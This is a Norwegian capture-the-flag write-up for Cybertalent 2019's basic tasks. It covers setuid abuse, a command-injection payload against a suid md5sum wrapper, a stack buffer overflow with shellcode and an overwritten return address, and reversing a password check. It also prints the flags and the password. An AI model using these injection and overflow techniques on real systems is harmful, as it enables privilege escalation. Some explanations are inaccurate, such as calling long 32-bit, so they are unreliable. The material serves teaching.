# Cybertalent 2019 Writeup

## Del 1 - Grunnleggende

### Scoreboard

I denne oppgaven får vi en fil ved navn `FLAGG` og en fil `LESMEG.md`

Denne er ganske rett frem:

```sh
$ cat FLAGG
b2be72e4cdc074f6acc260060ec71aec
$ scoreboard b2be72e4cdc074f6acc260060ec71aec
Kategori: 1. Grunnleggende
Oppgave:  1.1_scoreboard
Svar:     b2be72e4cdc074f6acc260060ec71aec

Gratulerer, korrekt svar!
```

Vi bruker kommandoen `cat` for å vise innholdet i filer

### SetUID

Oppgaven er ganske lik 1.1, men denne gangen kan vi ikke lese `FLAGG` direkte...

```sh
$ cat FLAGG
cat: FLAGG: Permission denied
```

Istedet blir man gitt to nye filer, `id` og `cat`, begge fungerer som sine respektive kommandorer med catchet at de kjører som bruker `basic2`.
Kommandoen `id` viser hvilken bruker du er logget inn som samt id-en til brukeren, vist her:

```sh

$ id
uid=1000(login) gid=1000(login) groups=1000(login)
$ ./id
uid=1000(login) gid=1000(login) euid=1002(basic2) groups=1000(login)
```

Du vil merke at når vi kjører filen `id` får vi i tillegg til 'uid' også en 'euid'; 'euid' står for "effective user id", og bestemmer hvilken bruker du har rettigheter som. I dette tillfellet er vår euid lik 1002, som betyr at vi har i praksis samme rettigheter som som bruker `basic2`. Dette er viktig fordi filen `FLAGG` er eid av `basic2`:

```sh
ls -l
total 96
-r-sr-xr-x 1 basic2 login 43744 Feb 12 04:00 cat
-r-------- 1 basic2 login    33 Feb 25 15:46 FLAGG
-r-sr-xr-x 1 basic2 login 43808 Feb 12 04:00 id
-r--r--r-- 1 basic2 login  1769 Feb 12 04:00 LESMEG.md
```

Ved å kjøre filen `cat` er det derfor mulig å lese flagget:

```sh
$./cat FLAGG
874aba6c77dbc828fdd61c447f760068
$ scoreboard 874aba6c77dbc828fdd61c447f760068
Kategori: 1. Grunnleggende
Oppgave:  1.2_setuid
Svar:     874aba6c77dbc828fdd61c447f760068

Gratulerer, korrekt svar!
```


### Injection

La oss starte med å se hilke filer vi har blitt utgitt:

```sh
$ ls -l
total 32
-r-------- 1 basic3 login    33 Feb 12 04:00 FLAGG
-r--r--r-- 1 basic3 login  1033 Feb 12 04:00 LESMEG.md
-r-sr-xr-x 1 basic3 login 16904 Feb 12 04:00 md5sum
-r--r--r-- 1 basic3 login   450 Feb 12 04:00 md5sum.c
```

Her blir vi gitt filen `md5sum`, samt hva ser ut til å være C-koden til filen, la oss ta en kikk nærmere på hva denne filen gjør:

```sh
$ cat md5sum.c
```
Resultatet er følgene C-kode:

```c
#include <sys/types.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int
main(int argc, char *argv[])
{
        if (argc != 2) {
                printf("Usage: %s <file>\n\n", argv[0]);
                printf("Suid-wrapper rundt md5sum.\n");
                exit(0);
        }

        char cmd[512];
        snprintf(cmd, sizeof(cmd), "/usr/bin/md5sum %s", argv[1]);

        printf("Kjører kommando:\n");
        printf(cmd);
        printf("\n\n");

        setreuid(geteuid(), geteuid());
        printf("Resultat:\n");
        system(cmd);
}
```

Dette er ett relativt enkelt program; Kort sagt sjekker den om det er skrevet inn nøyaktig 2 argument, hvis ikke får du en feilmelding, ellers legger den til det du skrev inn som argument i strengen `"/usr/bin/md5sum %s"` hvor `%s` er argumentet du skrev inn, og kjører den deretter som kommando med euid=1003 ergo bruker `basic3` ved bruk av funksjonen `system()`. 

Argumentene er lagret i variabelen `argv`, som er en såkalt "array" eller "liste", som kort sagt kan lagre flere verdier samtidig. Antall argumenter er lagret i variabelen `argc`. Vi ser videre at den sjekker om `argc` ikke er lik 2 ved `if (argc != 2)`; husk at når et program tar inn argumenter så telles navnet på programmet også som et argument, derfor hvis vi kjører programmet og legger til et argument så vil vi altså ha 2 argumenter. Om programmet ikke har to argumenter, alså hvis `argc != 2` returnerer som sant, så vil programmet printe en feilmelding til skjermen ved funksjonen `printf()` og avsluttes ved `exit(0);`. Ellers, hvis programmet får to argumenter, så vil det først deklareres en ny variabel `cmd` som er en liste med 512 tegn, en liste med tegn er også kjent som en "string".

Videre ser vi `snprintf(cmd, sizeof(cmd), "/usr/bin/md5sum %s", argv[1]);`, dette lagrer altså stringen `"/usr/bin/md5sum %s"` i `cmd`, hvor `%s` blir byttet ut med `argv[1]`, som er andre index av `argv`, altså argumentet vi skriver inn etter navnet på programmet (husk at datamaskiner teller fra 0, derfor så blir 2 til 1, derfor skriver vi `argv[1]` og ikke f.eks. `argv[2]`).

Videre printer den ut `cmd` og diverse annet til skjermen, men så kommer `setreuid(geteuid(), geteuid());`; denne kommanoen endrer euid-en (se forrige oppgave) til prosessen slik at det blir eieren av filen, altså `basic3`. Deretter printer den strengen `"Resultat:\n"` før den kjører `system(cmd);`. Funksjonen `system()` kjører rett og slett kommandoer, her kjører den altså det som er lagret i `cmd` som en kommando, og hvis du husker fra tidligere så var `cmd` satt til å være `"/usr/bin/md5sum %s"`, hvor `%s` er andre argument. `/usr/bin/md5sum` eller bare `md5sum` er en kommando som gir md5-hashet til en fil. Ganske enkelt så kjører den det du skriver som argument som `basic3`, med `/usr/bin/md5sum` skrevet foran.

Hvis du er lur (eller allerede løst oppgaven), ser du allerede hvordan vi kan utnytte dette:

```sh
$ ./md5sum "md5sum; cat FLAGG"
Kjører kommando:
/usr/bin/md5sum md5sum; cat FLAGG

Resultat:
28bfca9852af13e80bc678b91c66b54b  md5sum
6402196733ece6c25b2e9cb2956f44cd
$ scoreboard 6402196733ece6c25b2e9cb2956f44cd
Kategori: 1. Grunnleggende
Oppgave:  1.3_injection
Svar:     6402196733ece6c25b2e9cb2956f44cd

Gratulerer, korrekt svar!
```

Det vi altså gjør her er å bruke kvoteringer(") slik at alt blir ett argument, og så videre bruke semikolon (;) slik at vi kan kjøre ekstra kommandoer etter md5sum, vi utnytter dette til å kjøre `cat FLAGG` som `basic3` og dermed få flagget. En slik type svakhet kalles "injection", altså hvor vi legger til kode til bruker input (det brukeren skriver inn) som kjøres. Slike svakheter kan omgårs ved å sanitere bruker input, f.eks. ved å fjerne spesialtegn som semikolon.

### Overflow

Igjen begynner vi ved å se hva vi dealer med:

```sh
$ ls -l
total 40
-r-------- 1 basic4 login    33 Feb 25 15:46 FLAGG
-r--r--r-- 1 basic4 login  1986 Feb 12 04:00 LESMEG.md
-r-sr-xr-x 1 basic4 login 17208 Feb 12 04:00 overflow
-r--r--r-- 1 basic4 login  4535 Feb 12 04:00 overflow.c
-r--r--r-- 1 basic4 login    38 Feb 12 04:00 sample_shellcode
```

Her har vi en fil `overflow` samt C-koden og en til fil kalt `sample_shellcode`. Vi begynner ved å se på C-koden:

```sh
$cat overflow.c
```
Resultatet er følgene C-kode:

```c
#include <sys/mman.h>
#include <stdarg.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>

#define SHELLCODE_ADDRESS 0x303030303030
#define KGREEN "\033[01;32m"
#define KRED "\033[31m"
#define KRESET "\033[0m"

/*
 * Allocate a page of executable memory at SHELLCODE_ADDRESS,
 * and fill it with nop-sled and contents of environment variable SHC.
 * If SHC is not set, fill with breakpoints to trap program flow.
 */
char *
prep_shellcode(void)
{
        char *shc    = getenv("SHC");
        char *retval = mmap((char *)(SHELLCODE_ADDRESS & ~(4096 - 1)),
                            4096,
                            PROT_READ | PROT_WRITE | PROT_EXEC,
                            MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED,
                            -1,
                            0);

        if (retval == MAP_FAILED) {
                printf("Failed to mmap area for shellcode: %s\n", strerror(errno));
                exit(1);
        }

        if (shc && strlen(shc) < 4096) {
                /* SHC is set; fill memory page with nops and stuff shellcode at the end */
                memset(retval, 0x90, 4096);
                memcpy(retval + 4096 - strlen(shc), shc, strlen(shc));
        } else {
                /* No SHC; trigger trace/breakpoint trap */
                memset(retval, 0xcc, 4096);
        }

        /* Returning retval is more precise, but leaves a confusing null-byte in the address. */
        return (char *)SHELLCODE_ADDRESS;
}

/*
 * Print hexdump of memory, with one memory range ('modified') highlighted.
 * Optional arguments are address/name pairs to describe content of each line.
 */
void
hexdump(unsigned char *base, long len, long width,
        unsigned char *modified_start, long modified_length,
        long name_list_len, ...)
{
        void *  named_addresses[name_list_len / 2];
        char *  named_addresses_name[name_list_len / 2];
        va_list name_list;
        va_start(name_list, name_list_len);

        for (int n = 0; n < name_list_len / 2; n++) {
                named_addresses[n]      = va_arg(name_list, void *);
                named_addresses_name[n] = va_arg(name_list, char *);
        }

        for (int i = len; i >= 0; i -= width) {
                /* Print memory address, and possibly overwrite with name from named_addresses */
                printf("%-16p", base + i);
                for (int n = 0; n < name_list_len / 2; n++) {
                        if (base + i == named_addresses[n]) {
                                printf("\r%-16s", named_addresses_name[n]);
                                break;
                        }
                }

                /* Print hex dump of next `width` bytes */
                /* Use red color for bytes modified by strcpy */
                for (int n = 0; n < width; n++) {
                        if (modified_start <= base + i + n && base + i + n < modified_start + modified_length)
                                printf(KRED);
                        printf(" %02x" KRESET, base[i + n]);
                }

                /* Print ascii representation, or '.' if byte is non-printable */
                /* Use red color for bytes modified by strcpy */
                printf("  |");
                for (int n = 0; n < width; n++) {
                        if (modified_start <= base + i + n && base + i + n < modified_start + modified_length)
                                printf(KRED);
                        printf("%c" KRESET, (base[i + n] >= 0x20 && base[i + n] < 0x7f) ? base[i + n] : '.');
                }
                printf("|\n");
        }
}

int
main(int argc, char *argv[])
{
        long           above = 0;
        unsigned char  buffer[32];
        long           below         = 0x6867666564636261;
        long           width         = 8;
        unsigned char *shellcode_ptr = prep_shellcode();
        unsigned char *p             = (void *)&p;

        printf("\nBefore strcpy:\n");
        printf("above = 0x%16lx\n", above);
        printf("below = 0x%16lx\n", below);

        /* Copy first argument to buffer, potentially overflowing the stack */
        if (argc >= 2)
                strcpy(buffer, argv[1]);

        printf("\nAfter strcpy:\n");
        printf("above = 0x%16lx\n", above);
        printf("below = 0x%16lx\n", below);

        printf("\nStackdump:\n");
        hexdump(p, 128, width, buffer, argc >= 2 ? strlen(argv[1]) + 1 : 0, 16, &above, "&above", &buffer, "&buffer", &below, "&below", &width, "&width", &shellcode_ptr, "&shellcode_ptr", &p, "&p", p + 96, "stored rbp", p + 104, "stored rip");

        /* Now that output and overflows are done with, inspect the results */

        if (above == 0x4847464544434241) {
                printf(KGREEN "\nabove is correct!\n" KRESET);
                printf("Next step is to adjust the stored rip to point to shellcode\n");
        } else if (argc > 1 && strlen(argv[1]) >= (unsigned char *)&above - buffer) {
                printf(KRED "\nabove has incorrect value.\n" KRESET);
                printf("Read source code to find the magic number.\n");
                /* Call exit() to avoid returning to user controlled memory */
                exit(1);
        } else {
                printf("\nabove has not been overwritten.\n");
                printf("Supply an argument which is long enough to overflow buffer, ");
                printf("and modify the value of 'above'.\n");
        }

        /* Return, possibly to user controlled memory */
        return 0;
}
```

Her er det kansje lurt å starte med `main()` -funksjonen:

```c
main(int argc, char *argv[])
{
        long           above = 0;
        unsigned char  buffer[32];
        long           below         = 0x6867666564636261;
        long           width         = 8;
        unsigned char *shellcode_ptr = prep_shellcode();
        unsigned char *p             = (void *)&p;

        printf("\nBefore strcpy:\n");
        printf("above = 0x%16lx\n", above);
        printf("below = 0x%16lx\n", below);

        /* Copy first argument to buffer, potentially overflowing the stack */
        if (argc >= 2)
                strcpy(buffer, argv[1]);

        printf("\nAfter strcpy:\n");
        printf("above = 0x%16lx\n", above);
        printf("below = 0x%16lx\n", below);

        printf("\nStackdump:\n");
        hexdump(p, 128, width, buffer, argc >= 2 ? strlen(argv[1]) + 1 : 0, 16, &above, "&above", &buffer, "&buffer", &below, "&below", &width, "&width", &shellcode_ptr, "&shellcode_ptr", &p, "&p", p + 96, "stored rbp", p + 104, "stored rip");

        /* Now that output and overflows are done with, inspect the results */

        if (above == 0x4847464544434241) {
                printf(KGREEN "\nabove is correct!\n" KRESET);
                printf("Next step is to adjust the stored rip to point to shellcode\n");
        } else if (argc > 1 && strlen(argv[1]) >= (unsigned char *)&above - buffer) {
                printf(KRED "\nabove has incorrect value.\n" KRESET);
                printf("Read source code to find the magic number.\n");
                /* Call exit() to avoid returning to user controlled memory */
                exit(1);
        } else {
                printf("\nabove has not been overwritten.\n");
                printf("Supply an argument which is long enough to overflow buffer, ");
                printf("and modify the value of 'above'.\n");
        }

        /* Return, possibly to user controlled memory */
        return 0;
}
```


Samme som sist-oppgave tar vi inn variabelen `argc` som forteller oss hvor mange argumenter vi har, samt `argv` som er en liste med argumentene. Funksjonen starter ved å deklarere noen variabler;

`above` er en variabel av typen `long`, som betyr at det er et signert heltall med 32-bits kapasitet, altså den kan holde heltall opp til størrelse 2^31, både positive og negative. Hadde den ikke vært signert ville den hatt kapasitet opp til 2^32, men ville ikke kunnet inneholde et negativt tall. Denne variabelen får verdien 0. 

`buffer` er en liste av typen `unsigned char` og med lengde 32. "char" står for "character", altså et tegn, i denne konteksten en liste med tegn. Det at den er usignert betyr at hver plass på listen kan inneholde verdier mellom 0 og 255, i motsetning til hvis den hadde vært signert, hvor verdiene hadde kunne rangert mellom -127 og 127. En liste av typen `char` (tegn) er som nevt i sist oppgave kalt en "string", vi har altså en string som kan inneholde 32 tegn.

`below` er akkuratt som `above` frem til at det er gitt verdien `0x6867666564636261`, om vi converterer dette tallet til ASCII-verdier, får vi "hgfedcba", altså de første 8 bokstavene i alfabetet i baklengs rekkefølge, dette kan du også se om du vet at ASCII-verdien til "a" er 0x61 i hex og deler tallet i grupper på 2.

`width` er også en variabel av typen `long`, men men verdien 8. Variabelen har lite betyning uten for å hjelpe å visualisere programminnet når programmet kjøres.

`shellcode_ptr` er hvor ting blir interessant; variabelen er av typen `unsigned char`, altså er det et tegn. Du har kansje merket at variabel navnet starter med en stjerne (*), dette betyr at variabelen er en peker, altså at istedet for at variabelen selv inneholder en verdi, så inneholder den minneaddressen til hvor en rekke med verdier starter, altså fungerer den i dette tilfellet som en string. Verdien til denne variabelen får vi fra funksjonen `prep_shellcode()`;

```c
prep_shellcode(void)
{
        char *shc    = getenv("SHC");
        char *retval = mmap((char *)(SHELLCODE_ADDRESS & ~(4096 - 1)),
                            4096,
                            PROT_READ | PROT_WRITE | PROT_EXEC,
                            MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED,
                            -1,
                            0);

        if (retval == MAP_FAILED) {
                printf("Failed to mmap area for shellcode: %s\n", strerror(errno));
                exit(1);
        }

        if (shc && strlen(shc) < 4096) {
                /* SHC is set; fill memory page with nops and stuff shellcode at the end */
                memset(retval, 0x90, 4096);
                memcpy(retval + 4096 - strlen(shc), shc, strlen(shc));
        } else {
                /* No SHC; trigger trace/breakpoint trap */
                memset(retval, 0xcc, 4096);
        }

        /* Returning retval is more precise, but leaves a confusing null-byte in the address. */
        return (char *)SHELLCODE_ADDRESS;
}
```

Her starer vi med noen flere variabler som blir deklarert;

`shc` er av typen `char`, som hvis du husker er et tegn, den blir definert som en peker med en adresse vi får igjennom funksjonen `getenv()`; denne funksjonen tillater oss å få verdien til en såkalt "environment variable", altså en variabel som er lagret i miljøet og kan bli brukt av alle prosesser som kjører i miljøet. Catchet er at vi kan selv definere disse variablene ved bruk av shell-kommandoen `export`, som i dette tilfellet lar oss lagre arbitrære verdier i addressen denne pekeren peker til.

`retval` er også en peker av typen `char`, og blir gitt en verdi utifra funksjonen `mmap()`; denne funksjonen brukes til å allokere minne, i dette tilfellet allokeres minnet fra `SHELLCODE_ADDRESS` og 4096 byte bortover. Dette gjøres for å gi plass til shell-koden som vi skal bruke senere. Hvis du er interesseret i å vite mer om hvordan mmap fungerer ambefaler jeg [denne videoen](https://youtu.be/XV5sRaSVtXQ)

Videre sjekker funksjonen om mmap har fungert, hvis ikke gir den en feilmeldig og stopper programmet; ellers, sjekker den om shc har en verdi og at denne verdien tar opp mindre plass enn de 4096 bytene med data som ble allokert tidligere. Hvis begge sjekkene viser seg å være sanne, fylles først det allokerte minnet ved bruk av funksjonen `memset()` med `0x90`, som er en do-nothing instruks, så når programmet kjøres og dermed shell-koden, så vil resten av minnet ignoreres av programmet. Etter dette kopieres inholdet i `shc` til slutten av minnet slik at alt er klappet og klart når denne delen av minnet kjører. Om verken mmapen feilet eller shc-en ble satt riktig, så fylles minnet med `0xcc`, som er en interrupt-instruks.

Videre returneres en peker til `SHELLCODE_ADDRESS`. Kommentaren over påpeker at det hadde vært mer riktig å returnere `retval`, og begrunner avviket med at å gjøre slik ville etterlatt en null-byte i addressen, du kan se en forklaring av dette fenomenet i overnevte video på [5:16](https://youtu.be/XV5sRaSVtXQ?t=316)

Kort oppsummert allokerer funksjonen 4096 bytes med program-minne og lagrer shell-koden i det allokerte minnet, for å så returnere minne-addressen til shell-koden.

Nå, tilbake til `main()`;

```c
main(int argc, char *argv[])
{
        long           above = 0;
        unsigned char  buffer[32];
        long           below         = 0x6867666564636261;
        long           width         = 8;
        unsigned char *shellcode_ptr = prep_shellcode();
        unsigned char *p             = (void *)&p;

        printf("\nBefore strcpy:\n");
        printf("above = 0x%16lx\n", above);
        printf("below = 0x%16lx\n", below);

        /* Copy first argument to buffer, potentially overflowing the stack */
        if (argc >= 2)
                strcpy(buffer, argv[1]);

        printf("\nAfter strcpy:\n");
        printf("above = 0x%16lx\n", above);
        printf("below = 0x%16lx\n", below);

        printf("\nStackdump:\n");
        hexdump(p, 128, width, buffer, argc >= 2 ? strlen(argv[1]) + 1 : 0, 16, &above, "&above", &buffer, "&buffer", &below, "&below", &width, "&width", &shellcode_ptr, "&shellcode_ptr", &p, "&p", p + 96, "stored rbp", p + 104, "stored rip");

        /* Now that output and overflows are done with, inspect the results */

        if (above == 0x4847464544434241) {
                printf(KGREEN "\nabove is correct!\n" KRESET);
                printf("Next step is to adjust the stored rip to point to shellcode\n");
        } else if (argc > 1 && strlen(argv[1]) >= (unsigned char *)&above - buffer) {
                printf(KRED "\nabove has incorrect value.\n" KRESET);
                printf("Read source code to find the magic number.\n");
                /* Call exit() to avoid returning to user controlled memory */
                exit(1);
        } else {
                printf("\nabove has not been overwritten.\n");
                printf("Supply an argument which is long enough to overflow buffer, ");
                printf("and modify the value of 'above'.\n");
        }

        /* Return, possibly to user controlled memory */
        return 0;
}
```

Videre ser vi at programmet printer `above` og `below` til skjermen. Vi ser deretter at programmet sjekker om brukeren har satt ett eller flere argument etter programnavnet, og hvis sant kalles funksjonen `strcpy()`. Og det er her den fundamentale svakheten til programmet oppstår; siden det denne funksjonen gjør er å kopiere all data vi setter i argumentet vårt `argv[1]` til variabelen `buffer` med på lengde 32 byte, så vil all data over den lengden overskrive andre deler av minnet. Dette gjør det mulig for oss som angripere å overskrive deler av minnet slik at programmet oppfører seg slik vi vil. I dette tilfellet er vårt mål å omdirigere programflyten til å kjøre shell-koden lastet inn tidligere i programmet. Hvis du vil vite mer om buffer-overflow ambefaler jeg [dette utdragent fra kapittel 4 av "Computer Security: A Hands-on Approach" av Wenliang Du](http://www.cis.syr.edu/~wedu/seed/Book/book_sample_buffer.pdf). Jeg fant også [denne videoen](https://www.youtube.com/watch?v=8xonDJe3YxI) som er et foredrag som går detaljert igjennom hvordan man kan identifisere og utnytte en buffer overflow svakhet.

Neste steg i programmet er noe mer som blir printet til skjermen, og at funskjonen `hexdump()` blir kallet. Funksjonen visualiserer bare minnet vet å printe addresser til skjermen, og vi trenger ikke å vite hvordan den funker i detalj for å forstå hva vi gjør i oppgaven. Videre ser vi at programmet sjekker om variabelen `above` har verdien `0x4847464544434241`, om vi omgjør dette til ASCII tegn slig som vi gjorde med `below` får vi at dette blir "HGFEDCBA", altså de første 8 bokstavene i alfabetet baklengs. Hvorfor baklengs? Jo, fordi når ting blir lagret i minnet så blir det lagret siste del først, slik at når vi henter det ut fra minnet igjen får vi første del først. Hvis `above` har verdien `0x4847464544434241`, så printer den ut en positiv meldig og gir og vidre instrukser til å få rip til å peke til shellcode; ellers, får vi en feilmeldig og programmet blir avsluttet uten å få kjøre videre. Hvis vi skroller opp til toppen av programmet ser vi at `SHELLCODE_ADDRESS` er definert som `0x303030303030`, som når omgjort til ASCII tegn blir dette addresse `0x00000000` siden ASCII-kode 30 er tegnet 0.

Kort oppsummert så definerer koden en buffer på 32 byte, deretter laster den inn en miljø-variabel som vi kan definere, og kopierer første argumentet vi kjører programmet med inn i bufferen. Vårt mål er å bruke miljø-variabelen sammen med en buffer overflow til å få programmet til å kjøre kode som lar oss ta kontroll over den lokale brukeren for å så lese flagget.

Nå som vi har gått igjennom koden, kan vi forme vår angrepsplan. Først, må vi laste inn shell-koden til en miljø-variabel ved navn `SHC`. Dette kan som sagt gjøres med kommandoen `export`:


```sh
$ export SHC=$(cat sample_shellcode)
```

Her definerer jeg `SHC` som `$(cat sample_shellcode)`, som da gir variabelen verdi lik innholdet i filen `sample_shellcode`, som inneholder shell-koden vi trenger for å få tilgang til flagget. Videre er det da å kjøre `overflow`; i følge koden så skal `above` være lik de første 8 bokstavene i alfabetet, og siden `buffer` er 32 byte lang, må jeg altså sette inn 32 tegn fulgt av de første 8 bokstavene i alfabetet:

```sh
$ ./overflow AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABCDEFGH

Before strcpy:
above = 0x               0
below = 0x6867666564636261

After strcpy:
above = 0x4847464544434241
below = 0x6867666564636261

Stackdump:
0x7fff35500a80   00 00 04 00 02 00 00 00  |........|
0x7fff35500a78   48 0b 50 35 ff 7f 00 00  |H.P5....|
0x7fff35500a70   00 00 00 00 00 00 00 00  |........|
stored rip       9b c0 45 f7 4d 7f 00 00  |..E.M...|
stored rbp       c0 ea ae 6d c3 55 00 00  |...m.U..|
0x7fff35500a58   f0 e0 ae 6d c3 55 00 00  |...m.U..|
0x7fff35500a50   00 00 00 00 00 00 00 00  |........|
&above           41 42 43 44 45 46 47 48  |ABCDEFGH|
0x7fff35500a40   41 41 41 41 41 41 41 41  |AAAAAAAA|
0x7fff35500a38   41 41 41 41 41 41 41 41  |AAAAAAAA|
0x7fff35500a30   41 41 41 41 41 41 41 41  |AAAAAAAA|
0x7fff35500a28   41 41 41 41 41 41 41 41  |AAAAAAAA|
&buffer          41 41 41 41 41 41 41 41  |AAAAAAAA|
&below           61 62 63 64 65 66 67 68  |abcdefgh|
&width           08 00 00 00 00 00 00 00  |........|
&shellcode_ptr   30 30 30 30 30 30 00 00  |000000..|
&p               00 0a 50 35 ff 7f 00 00  |..P5....|

above is correct!
Next step is to adjust the stored rip to point to shellcode
```

Videre må vi som sagt overskrive rip til å peke på shell-koden. Siden addressen er 0x00000000, må vi altså skrive inn åtte nuller i rip, som vi ser er 3*8=24 tegn over `above`. Dette vil returnere koden til den delen av minnet hvor shell-koden ligger, og vi vil få kontroll over `basic4`-brukeren:


```sh
$ ./overflow AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABCDEFGH000000000000000000000000000000

Before strcpy:
above = 0x               0
below = 0x6867666564636261

After strcpy:
above = 0x4847464544434241
below = 0x6867666564636261

Stackdump:
0x7fff88347790   00 00 04 00 02 00 00 00  |........|
0x7fff88347788   58 78 34 88 ff 7f 00 00  |Xx4.....|
0x7fff88347780   00 00 00 00 00 00 00 00  |........|
stored rip       30 30 30 30 30 30 00 00  |000000..|
stored rbp       30 30 30 30 30 30 30 30  |00000000|
0x7fff88347768   30 30 30 30 30 30 30 30  |00000000|
0x7fff88347760   30 30 30 30 30 30 30 30  |00000000|
&above           41 42 43 44 45 46 47 48  |ABCDEFGH|
0x7fff88347750   41 41 41 41 41 41 41 41  |AAAAAAAA|
0x7fff88347748   41 41 41 41 41 41 41 41  |AAAAAAAA|
0x7fff88347740   41 41 41 41 41 41 41 41  |AAAAAAAA|
0x7fff88347738   41 41 41 41 41 41 41 41  |AAAAAAAA|
&buffer          41 41 41 41 41 41 41 41  |AAAAAAAA|
&below           61 62 63 64 65 66 67 68  |abcdefgh|
&width           08 00 00 00 00 00 00 00  |........|
&shellcode_ptr   30 30 30 30 30 30 00 00  |000000..|
&p               10 77 34 88 ff 7f 00 00  |.w4.....|

above is correct!
Next step is to adjust the stored rip to point to shellcode
$ id
uid=1004(basic4) gid=1000(login) groups=1000(login)
$ cat FLAGG
0b90e7bfa168232b4b793ba619005e8a
$ scoreboard 0b90e7bfa168232b4b793ba619005e8a
Kategori: 1. Grunnleggende
Oppgave:  1.4_overflow
Svar:     0b90e7bfa168232b4b793ba619005e8a

Gratulerer, korrekt svar!
```


### Reversing

Dette er den siste oppgaven i det grunnleggende oppgavesettet. Vi blir gitt ett program kalt check_password, men vi får ikke lest C-koden. Her er målet å reversere filen ved bruk av verktøy. Jeg nedlastet filen og lastet den inn i Ghidra, et verktøy utvilken av den Amerikanske Sikkerhetstjeneste NSA. Etter å ha sett litt rundt fant jeg koden vi er ute etter:

```
undefined8 check_password(char *param_1)

{
    int iVar1;
    size_t sVar2;
    undefined8 uVar3;
    char local_16;
    undefined local_15;
    undefined local_14;
    undefined local_13;
    undefined local_12;
    undefined local_11;
    undefined local_10;
    undefined local_f;
    undefined local_e;
    undefined local_d;
    int local_c;
    
    sVar2 = strlen(param_1);
    if (sVar2 == 0x20) {
        iVar1 = strncmp("Reverse_engineering",param_1,0x13);
        if (iVar1 == 0) {
            if (param_1[0x13] == '_') {
                local_c = *(int *)(param_1 + 0x13);
                if (local_c == 0x5f72655f) {
                    local_16 = 'm';
                    local_15 = 0x6f;
                    local_14 = 0x72;
                    local_13 = 0x73;
                    local_12 = 0x6f;
                    local_11 = 0x6d;
                    local_10 = 0x74;
                    local_f = 0x5f;
                    local_e = 0x5f;
                    local_d = 0;
                    iVar1 = strncmp(&local_16,param_1 + 0x17,10);
                    if (iVar1 == 0) {
                        uVar3 = 0;
                    }
                    else {
                        uVar3 = 5;
                    }
                }
                else {
                    uVar3 = 4;
                }
            }
            else {
                uVar3 = 3;
            }
        }
        else {
            uVar3 = 2;
        }
    }
    else {
        uVar3 = 1;
    }
    return uVar3;
}
```

Det den gjør er ganske enkelt;

først sjekker den om det vi skriver inn i argumentet har lengde på `0x20` med `if (sVar2 == 0x20)` , I titallssystemet blir dette 32.

Videre sjekker den om det vi har skrevet inn matcher opp til strengen "Rerverse_engineering" opptil `0x13` tegn, altså 19 tegn ved `iVar1 = strncmp("Reverse_engineering",param_1,0x13);`. Så sjekker den om det 19. tegnet er "_" ved `if (param_1[0x13] == '_')`.

`local_c = *(int *)(param_1 + 0x13);` og `if (local_c == 0x5f72655f)` sjekker om de neste fire tegnene i argumentet er `_er_` (underscore, e, r, underscore).

Sist definerer den flere variabler fra `local16` og ned. Om vi gjør om disse hexadesimale tallene til tegn får vi at det blir til sammen "morsomt__". Så sjekker den ved `strncmp(&local_16,param_1 + 0x17,10);` om det vi skrev inn fra tegn nr `0x17` og bortover matcher en `local_16`. Siden den referer til `local_16` ved bruk av en peker som indikert med ampersand-tegnet (&), leser den det som en string fram til den treffer en null. Derfor vil den sjekke hele stringen ("morsomt__"), og stoppe ved `local_d`

Setter vi alt dette sammen får vi at passordet blir "Reverse_engineering_er_morsomt__":

```
$ ./check_password Reverse_engineering_er_morsomt__
Korrekt passord!
$ cat FLAGG
0ed7595beb56c85a18fbc12e47cc8eed
$ scoreboard 0ed7595beb56c85a18fbc12e47cc8eed
Kategori: 1. Grunnleggende
Oppgave:  1.5_reversing
Svar:     0ed7595beb56c85a18fbc12e47cc8eed

Gratulerer, korrekt svar!
$
```
